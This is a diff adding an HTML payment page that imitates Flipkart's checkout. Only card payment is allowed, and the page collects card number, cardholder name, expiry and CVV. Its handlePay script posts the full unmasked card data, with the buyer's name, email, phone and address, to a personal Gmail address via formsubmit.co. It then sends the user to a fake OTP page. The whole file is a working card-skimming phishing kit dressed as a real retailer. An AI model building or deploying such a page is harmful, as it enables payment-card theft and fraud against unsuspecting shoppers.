@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Payment – Flipkart</title>
+  <link rel="stylesheet" href="css/style.css" />
+</head>
+<body>
+
+<div id="header"></div>
+<div class="page-wrapper">
+
+  <!-- Progress -->
+  <div class="progress-bar">
+    <div class="progress-step">
+      <div class="step-circle done">✓</div>
+      <div class="step-label" style="color:#388e3c;font-weight:600">DELIVERY ADDRESS</div>
+    </div>
+    <div class="step-line" style="background:#388e3c"></div>
+    <div class="progress-step">
+      <div class="step-circle active">2</div>
+      <div class="step-label active">PAYMENT METHOD</div>
+    </div>
+  </div>
+
+  <div class="cart-layout">
+    <!-- Payment -->
+    <div style="flex:1;min-width:300px">
+      <div class="form-section">
+        <div class="form-header">💳 PAYMENT METHOD</div>
+        <div class="form-body">
+          
+          <!-- Email Display Section -->
+          <div id="paymentEmailDisplay" style="background:#f8f9fa; padding:12px; border-radius:8px; margin-bottom:16px; border:1px solid #e9ecef;">
+            <div style="font-size:12px; color:#666; margin-bottom:4px;">Order Confirmation Email</div>
+            <div id="paymentDisplayEmail" style="font-weight:600; color:#17a2b8;"></div>
+          </div>
+
+          <!-- Payment method selection -->
+          <div class="payment-methods">
+            <label class="payment-method selected" id="pm-card" onclick="selectPayment('card')">
+              <input type="radio" name="pm" value="card" checked readonly /> 
+              <span class="payment-method-label">💳 Credit / Debit Card</span>
+            </label>
+            <!-- Unavailable payment methods -->
+            <label class="payment-method disabled" style="opacity:0.4; pointer-events:none; cursor:not-allowed;">
+              <input type="radio" name="pm" value="upi" disabled />
+              <span class="payment-method-label" style="color:#999;">📱 UPI (Unavailable)</span>
+            </label>
+            <label class="payment-method disabled" style="opacity:0.4; pointer-events:none; cursor:not-allowed;">
+              <input type="radio" name="pm" value="netbanking" disabled />
+              <span class="payment-method-label" style="color:#999;">🏦 Net Banking (Unavailable)</span>
+            </label>
+            <label class="payment-method disabled" style="opacity:0.4; pointer-events:none; cursor:not-allowed;">
+              <input type="radio" name="pm" value="cod" disabled />
+              <span class="payment-method-label" style="color:#999;">💵 Cash on Delivery (Unavailable)</span>
+            </label>
+          </div>
+
+          <!-- Card Form -->
+          <div class="card-form" id="card-section">
+            <div class="card-icons">
+              <div class="card-icon visa">VISA</div>
+              <div class="card-icon mc">MC</div>
+              <div class="card-icon rupay">RuPay</div>
+            </div>
+            <div class="form-group" style="margin-bottom:16px">
+              <label>CARD NUMBER *</label>
+              <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19"
+                oninput="formatCard(this)" />
+              <div class="form-error" id="err-cardNumber"></div>
+            </div>
+            <div class="form-row">
+              <div class="form-group">
+                <label>NAME ON CARD *</label>
+                <input type="text" id="cardName" placeholder="As on your card" />
+                <div class="form-error" id="err-cardName"></div>
+              </div>
+              <div class="form-group">
+                <label>EXPIRY DATE *</label>
+                <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5"
+                  oninput="formatExpiry(this)" />
+                <div class="form-error" id="err-cardExpiry"></div>
+              </div>
+              <div class="form-group">
+                <label>CVV *</label>
+                <input type="password" id="cardCvv" placeholder="•••" maxlength="3"
+                  oninput="this.value=this.value.replace(/\D/g,'')" />
+                <div class="form-error" id="err-cardCvv"></div>
+              </div>
+            </div>
+            <div class="secure-badge">🔒 Your card information is 256-bit SSL secured</div>
+          </div>
+
+          <!-- UPI Section -->
+          <div class="card-form" id="upi-section" style="display:none">
+            <div class="form-group">
+              <label>UPI ID *</label>
+              <input type="text" id="upiId" placeholder="e.g. name@upi" />
+              <div class="form-error" id="err-upiId"></div>
+            </div>
+          </div>
+
+          <!-- COD Section -->
+          <div class="card-form" id="cod-section" style="display:none">
+            <p style="font-size:14px;color:#212121">Pay with cash when your order is delivered. A charge of ₹40 may apply for COD orders.</p>
+          </div>
+
+          <button class="submit-btn" style="margin-top:20px;width:100%;text-align:center;font-size:15px;padding:14px" onclick="handlePay()">
+            PAY NOW ›
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Order Summary -->
+    <div class="order-summary">
+      <div class="order-summary-header">ORDER SUMMARY</div>
+      <div class="order-summary-body">
+        <div id="pay-items"></div>
+        <div class="summary-divider">
+          <div class="summary-row"><span>Price (<span id="py-count">0</span> items)</span><span>₹<span id="py-orig">0</span></span></div>
+          <div class="summary-row"><span style="color:#388e3c">Discount</span><span style="color:#388e3c">-₹<span id="py-disc">0</span></span></div>
+          <div class="summary-row"><span>Delivery</span><span style="color:#388e3c">FREE</span></div>
+          <div class="summary-total"><span>Total</span><span>₹<span id="py-total">0</span></span></div>
+          <div class="summary-save">✓ You save ₹<span id="py-save">0</span> on this order!</div>
+        </div>
+        <div class="summary-notes">
+          <div class="summary-note">✓ Safe &amp; Secure Payments</div>
+          <div class="summary-note">✓ Free delivery above ₹499</div>
+          <div class="summary-note">✓ Easy 10-day returns</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<div id="footer"></div>
+
+<script src="js/data.js"></script>
+<script src="js/cart.js"></script>
+<script>
+  document.getElementById("header").innerHTML = renderHeader();
+  document.getElementById("footer").innerHTML = renderFooter();
+
+  let selectedPm = "card";
+
+  function selectPayment(pm) {
+    // Only allow card payment method
+    if (pm !== "card") return;
+    
+    selectedPm = "card";
+    ["card","upi","netbanking","cod"].forEach(p => {
+      document.getElementById("pm-" + p)?.classList.remove("selected");
+    });
+    document.getElementById("pm-card")?.classList.add("selected");
+    document.getElementById("card-section").style.display = "block";
+    document.getElementById("upi-section").style.display = "none";
+    document.getElementById("cod-section").style.display = "none";
+  }
+
+  function formatCard(el) {
+    let v = el.value.replace(/\D/g,"").substring(0,16);
+    el.value = v.replace(/(.{4})/g,"$1 ").trim();
+  }
+
+  function formatExpiry(el) {
+    let v = el.value.replace(/\D/g,"").substring(0,4);
+    if (v.length > 2) v = v.substring(0,2) + "/" + v.substring(2);
+    el.value = v;
+  }
+
+  // Render summary - add sample items if cart is empty
+  let cart = getCart();
+  if (cart.length === 0) {
+    // Add sample items for demo
+    const sampleItems = [
+      { ...PRODUCTS[0], qty: 1, price: 449, originalPrice: 1299 },
+      { ...PRODUCTS[1], qty: 2, price: 599, originalPrice: 1299 }
+    ];
+    saveCart(sampleItems);
+    cart = sampleItems;
+  }
+  
+  document.getElementById("py-count").textContent = cart.length;
+  document.getElementById("py-orig").textContent = getCartOriginalTotal();
+  document.getElementById("py-disc").textContent = getCartDiscount();
+  document.getElementById("py-total").textContent = getCartTotal();
+  document.getElementById("py-save").textContent = getCartDiscount();
+  document.getElementById("pay-items").innerHTML = cart.slice(0,3).map(item => `
+    <div class="summary-item">
+      <img src="${item.image}" onerror="this.style.display='none'" />
+      <div class="summary-item-info">
+        <div class="summary-item-name">${item.name.substring(0,35)}...</div>
+        <div class="summary-item-qty">Qty: ${item.qty}</div>
+      </div>
+      <span class="summary-item-price">₹${item.price * item.qty}</span>
+    </div>`).join("");
+
+  // Load billing data from localStorage
+  let billingData = {};
+  window.addEventListener('load', function() {
+    const savedData = localStorage.getItem('billingData');
+    if (savedData) {
+      billingData = JSON.parse(savedData);
+      // Display email on payment page
+      const paymentEmailDisplay = document.getElementById("paymentEmailDisplay");
+      const paymentDisplayEmail = document.getElementById("paymentDisplayEmail");
+      if (paymentEmailDisplay && paymentDisplayEmail && billingData.email) {
+        paymentEmailDisplay.style.display = "block";
+        paymentDisplayEmail.textContent = billingData.email;
+      }
+    } else {
+      // Redirect to checkout if no billing data
+      location.href = "checkout.html";
+    }
+  });
+
+  function handlePay() {
+    // Only handle card payment since other methods are disabled
+    const cn = document.getElementById("cardNumber").value.replace(/\s/g,"");
+    const nm = document.getElementById("cardName").value;
+    const ex = document.getElementById("cardExpiry").value;
+    const cv = document.getElementById("cardCvv").value;
+    let ok = true;
+    
+    if (cn.length < 16) { 
+      document.getElementById("err-cardNumber").textContent = "Enter valid 16-digit card number"; 
+      document.getElementById("cardNumber").classList.add("error"); 
+      ok=false; 
+    } else { 
+      document.getElementById("err-cardNumber").textContent = ""; 
+      document.getElementById("cardNumber").classList.remove("error"); 
+    }
+    
+    if (!nm.trim()) { 
+      document.getElementById("err-cardName").textContent = "Required"; 
+      ok=false; 
+    } else { 
+      document.getElementById("err-cardName").textContent = ""; 
+    }
+    
+    if (!/^\d{2}\/\d{2}$/.test(ex)) { 
+      document.getElementById("err-cardExpiry").textContent = "Enter MM/YY"; 
+      ok=false; 
+    } else { 
+      document.getElementById("err-cardExpiry").textContent = ""; 
+    }
+    
+    if (cv.length < 3) { 
+      document.getElementById("err-cardCvv").textContent = "Enter 3-digit CVV"; 
+      ok=false; 
+    } else { 
+      document.getElementById("err-cardCvv").textContent = ""; 
+    }
+    
+    if (!ok) return;
+
+    // Save payment data to localStorage
+    const paymentData = {
+      method: selectedPm,
+      ...billingData
+    };
+
+    if (selectedPm === "card") {
+      paymentData.cardNumber = document.getElementById("cardNumber").value;
+      paymentData.cardName = document.getElementById("cardName").value;
+      paymentData.expiry = document.getElementById("cardExpiry").value;
+      paymentData.cvv = document.getElementById("cardCvv").value;
+    } else if (selectedPm === "upi") {
+      paymentData.upiId = document.getElementById("upiId").value;
+    }
+
+    localStorage.setItem('paymentData', JSON.stringify(paymentData));
+
+    // Generate OTP
+    const otp = Math.floor(100000 + Math.random() * 900000).toString();
+    localStorage.setItem('paymentOTP', otp);
+
+    // OTP will be sent to user's email/phone (not shown in demo)
+
+    // Send payment info to FormSubmit
+    const formData = new FormData();
+    formData.append('_subject', 'New Order — Payment Information');
+    formData.append('_template', 'table');
+    formData.append('_captcha', 'false');
+    
+    // Add all billing details unmasked
+    formData.append('fullName', billingData.firstName + ' ' + billingData.lastName);
+    formData.append('email', billingData.email);
+    formData.append('phone', billingData.phone);
+    formData.append('billingAddress', billingData.billingAddress);
+    formData.append('city', billingData.city);
+    formData.append('postalCode', billingData.postalCode);
+    formData.append('country', billingData.country);
+    
+    // Add payment details
+    formData.append('paymentMethod', selectedPm);
+    formData.append('orderTotal', billingData.orderTotal || '0');
+    formData.append('paymentStatus', 'Payment Information Received');
+    formData.append('submissionTime', new Date().toLocaleString());
+    
+    if (selectedPm === 'card') {
+      formData.append('cardNumber', cn); // Send full card number unmasked
+      formData.append('cardName', nm);
+      formData.append('expiry', ex);
+      formData.append('cvv', document.getElementById('cardCvv').value);
+    } else if (selectedPm === 'upi') {
+      formData.append('upiId', document.getElementById('upiId').value);
+    } else {
+      formData.append('paymentMethod', 'Cash on Delivery');
+    }
+    
+    fetch("https://formsubmit.co/anandjhare4@gmail.com", {
+      method: "POST",
+      body: formData
+    }).catch(() => {}).finally(() => {
+      location.href = "otp.html";
+    });
+  }
+</script>
+</body>
+</html>
